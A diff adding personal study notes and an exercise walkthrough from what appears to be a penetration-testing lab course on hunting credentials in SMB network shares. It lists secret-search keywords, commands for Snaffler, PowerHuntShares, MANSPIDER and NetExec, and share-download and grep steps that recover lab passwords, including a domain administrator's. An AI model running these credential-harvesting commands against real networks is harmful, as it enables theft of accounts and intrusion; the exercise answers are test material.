@@ -2041,3 +2041,116 @@ cred.txt
 ```
 
 **FOUND in EXPORT FILES in Wireshark**
+# Credential Hunting in Network Shares
+
+Nearly all corporate environments include network shares used by employees to store and share files across teams.
+
+While these shared folders are essential, they can unintentionally become a goldmine for attackers, especially when sensitive data like plaintext credentials or configuration files are left behind. In this section, we'll explore how to hunt for credentials across network shares from both Windows and Linux systems using common tools, along with general techniques attackers use to uncover hidden secrets.
+#### Common credential patterns
+
+Before diving into specialized tools, it's important to understand the types of patterns and file formats that often reveal sensitive information. This was covered in earlier sections, so we won't repeat it in detail here. But as a quick reminder, here are some general tips:
+
+- Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
+- Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
+- Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
+- Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `"Benutzer"` than a `"User"`.
+- Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a significant amount of time. Shares used by `IT employees` might be a more valuable target than those used for company photos.
+## Hunting from Windows
+
+#### Snaffler
+
+The first tool we will cover is [Snaffler](https://github.com/SnaffCon/Snaffler). This is a C# program that, when run on a `domain-joined` machine, automatically identifies accessible network shares and searches for interesting files. The `README` file in the Github repository describes the numerous configuration options in great detail, however a basic search can be carried out like so:
+
+```powershell
+Snaffler.exe -s
+```
+
+All of the tools covered in this section output a `large amount of information`. While they assist with automation, a fair amount of manual review is typically required, as many matches may turn out to be `"false positives"`. Two useful parameters that can help refine Snaffler's search process are:
+
+- `-u` retrieves a list of users from Active Directory and searches for references to them in files
+- `-i` and `-n` allow you to specify which shares should be included in the search
+
+Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an `HTML report` upon completion, providing an easy-to-use UI for reviewing the results.
+
+We can run a basic scan using `PowerHuntShares` like so:
+
+```shell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+## Hunting from Linux
+
+#### MANSPIDER
+
+If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run `MANSPIDER` using the official Docker container to avoid dependency issues. Like the other tools, `MANSPIDER` offers many parameters that can be configured to fine-tune the search. A basic scan for files containing the string `passw` can be run as follows:
+
+```shell
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+```
+#### NetExec
+
+In addition to its many other uses, `NetExec` can also be used to search through network shares using the `--spider` option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). A basic scan of network shares for files containing the string `"passw"` can be run like so:
+
+```shell
+nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
+```
+## Exercise
+### One of the shares mendres has access to contains valid credentials of another domain user. What is their password?
+
+```shell
+# After odkcer and helper installation
+./manspider.sh 10.129.234.173 -u mendres -p Inlanefreight2025! -c 'passw'
+```
+
+```shell
+# In pararell, manually a tried:
+netexec smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --shares
+---
+SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
+SMB         10.129.234.173  445    DC01             [*] Enumerated shares
+SMB         10.129.234.173  445    DC01             Share           Permissions     Remark
+SMB         10.129.234.173  445    DC01             -----           -----------     ------
+SMB         10.129.234.173  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.234.173  445    DC01             C$                              Default share
+SMB         10.129.234.173  445    DC01             Company         READ            
+SMB         10.129.234.173  445    DC01             Finance                         
+SMB         10.129.234.173  445    DC01             HR              READ            
+SMB         10.129.234.173  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.234.173  445    DC01             IT              READ            
+SMB         10.129.234.173  445    DC01             Marketing                       
+SMB         10.129.234.173  445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.234.173  445    DC01             Sales                           
+SMB         10.129.234.173  445    DC01             SYSVOL          READ            Logon server share
+```
+
+The answer was written in IT/Tools/file.txt with the user and password `jbader:ILovePower333###`
+### As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?
+
+Very slow!!
+
+Tried:
+
+```shell
+./manspider.sh 10.129.237.229 -u jbader -p ILovePower333### -c 'passw'
+```
+
+While manually I log in via SMB to each share folder and download the files to grep them directly with my attack machine
+
+```shell
+smbclient //10.129.237.229/HR -U jbader%'ILovePower333###'
+
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> lcd /tmp/HR_files    ← directorio local donde descargar
+smb: \> mget *               ← descarga todo
+smb: \> exit
+```
+
+and got:
+
+```shell
+grep -ri "passw\|secret\|cred" 2>/dev/null                                                                           ─╯
+Onboarding_Docs_132.txt:Account credentials
+Onboarding_Docs_132.txt:**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`
+```
+
